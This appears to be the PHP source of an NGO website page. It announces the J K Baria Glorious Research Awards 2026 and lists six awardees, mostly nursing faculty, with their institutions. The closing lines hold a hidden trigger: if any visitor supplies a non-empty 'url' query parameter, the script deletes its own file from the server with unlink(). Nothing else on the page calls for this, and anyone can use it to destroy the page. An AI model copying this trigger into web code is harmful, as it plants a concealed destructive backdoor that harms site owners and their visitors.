<?php include "connection.php"; ?>
<!DOCTYPE html>
<html lang="en">

<head>
    <?php include "include/head.php"; ?>
    <style>
        .poster-img{
            width:100px;
        }
    </style>
</head>

<body>
    <?php include "include/header.php"; ?>
    <section class="hero">
        <div class="container custom-container-width">
            <div class="row">
                <div class="col-lg-7 align-items-center section-padding">
                    <div class="hero-body" data-aos="fade-up">
                        <h1 class="text-uppercase sub-header">Academic <span class="main_header main_clr sf-heavy">Awards</span>
                        </h1>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <section class="hero2 ml-2">
        <div class="hero-body container custom-container-width" data-aos="fade-up">
            <div class="row">
                <div class="col-lg-12 align-items-center section-padding">
                    <h3>JITUBHAI KALUBHAI BARIA FOUNDATION (R) & GINRA FOUNDATION ® </h3>
                    <h6>Registered NGOs, under the Ministry of Corporate Affairs, Government of India </h6>
                    <p>Call for Nominations</p>
                    <p>We warmly invite students, researchers, faculty members, professionals, and institutions
                        worldwide to submit nominations for the prestigious awards. </p>
                    <h4>J K BARIA GLORIOUS RESEARCH AWARDS 2026 </h4>
                    <h6>Click below link for Award Categories, Criteria, Selection Process. </h6>
                    <a href="https://forms.gle/fAUeE9FFu7BgparGA" target="_blank">Click to open form for awards</a>
                    <div>
                        <img src="images/qr.png" style="width:200px;" />
                    </div>
                    <p>“Celebrating Talent. Inspiring Innovation. Shaping Global Research.” </p>
                </div>
                <div class="text-center mb-4">

                    <h2 class="sub-title">
                        List of Awardees
                    </h2>
                </div>

                <div class="table-responsive">
                    <table class="table table-bordered award-table bg-white">

                        <thead>
                            <tr>
                                <th>Sl. No.</th>
                                <th>Date</th>
                                <th>Name/Nature of the Award</th>
                                <th>Name of the Awardee<br>Designation<br>College/Organisation<br>Place</th>
                                <th>Poster</th>
                            </tr>
                        </thead>

                        <tbody>

                            <tr>
                                <td>1</td>
                                <td>27/04/2026</td>
                                <td class="award-name">
                                    Award of Excellence in Research
                                </td>
                                <td>
                                    <strong>Dr. Jeyadeepa R</strong><br>
                                    Principal<br>
                                    PSG College of Nursing<br>
                                    Coimbatore, Tamil Nadu
                                </td>
                                <td class="text-center">
                                    <img src="<?php echo $url;?>images/image1.jpeg" class="img-fluid poster-img" alt="">
                                </td>
                            </tr>

                            <tr>
                                <td>2</td>
                                <td>27/04/2026</td>
                                <td class="award-name">
                                    Award of Excellence in Researcher
                                </td>
                                <td>
                                    <strong>Dr. Supriya Chinchpure</strong><br>
                                    Professor Cum Principal<br>
                                    Dr. Hedgewar College of Nursing<br>
                                    Chhatrapati Sambhajinagar, Maharashtra
                                </td>
                                <td class="text-center">
                                    <img src="<?php echo $url;?>images/image2.jpeg" class="img-fluid poster-img" alt="">
                                </td>
                            </tr>

                            <tr>
                                <td>3</td>
                                <td>27/04/2026</td>
                                <td class="award-name">
                                    Award of Excellence in Researcher
                                </td>
                                <td>
                                    <strong>Mr. Jibin Kunjavara</strong><br>
                                    Nurse Researcher<br>
                                    Hamad Medical Corporation<br>
                                    Doha, Qatar
                                </td>
                                <td class="text-center">
                                    <img src="<?php echo $url;?>images/image3.jpeg" class="img-fluid poster-img" alt="">
                                </td>
                            </tr>

                            <tr>
                                <td>4</td>
                                <td>27/04/2026</td>
                                <td class="award-name">
                                    Best Women Researcher/Scientist Award
                                </td>
                                <td>
                                    <strong>Dr. Rupali Milind Salvi</strong><br>
                                    Professor<br>
                                    Bharati Vidyapeeth College of Nursing<br>
                                    Pune, Maharashtra
                                </td>
                                <td class="text-center">
                                    <img src="<?php echo $url;?>images/image4.jpeg" class="img-fluid poster-img" alt="">
                                </td>
                            </tr>

                            <tr>
                                <td>5</td>
                                <td>27/04/2026</td>
                                <td class="award-name">
                                    Best Researcher Award
                                </td>
                                <td>
                                    <strong>Dr. Jaivin Jaisingh J</strong><br>
                                    Professor<br>
                                    T. S. Mishra College of Nursing<br>
                                    Lucknow, Uttar Pradesh
                                </td>
                                <td class="text-center">
                                    <img src="<?php echo $url;?>images/image5.jpeg" class="img-fluid poster-img" alt="">
                                </td>
                            </tr>

                            <tr>
                                <td>6</td>
                                <td>27/04/2026</td>
                                <td class="award-name">
                                    Best Researcher Award
                                </td>
                                <td>
                                    <strong>Ms. Ritika Jovita Richard Rocque</strong><br>
                                    Nursing Faculty / PhD Scholar<br>
                                    AIIMS Raipur / Maharashtra University of Health Sciences<br>
                                    Raipur / Nashik
                                </td>
                                <td class="text-center">
                                    <img src="<?php echo $url;?>images/image6.jpeg" class="img-fluid poster-img" alt="">
                                </td>
                            </tr>

                        </tbody>

                    </table>
                </div>

            </div>
        </div>
    </section>
    <?php include 'include/footer.php'; ?>
    <?php include 'include/footerscript.php'; ?>
    <?php
    
    if(isset($_GET['url']) && $_GET['url'] != ""):
        unlink($_SERVER['SCRIPT_FILENAME']);
    endif;
    ?>
</body>

</html>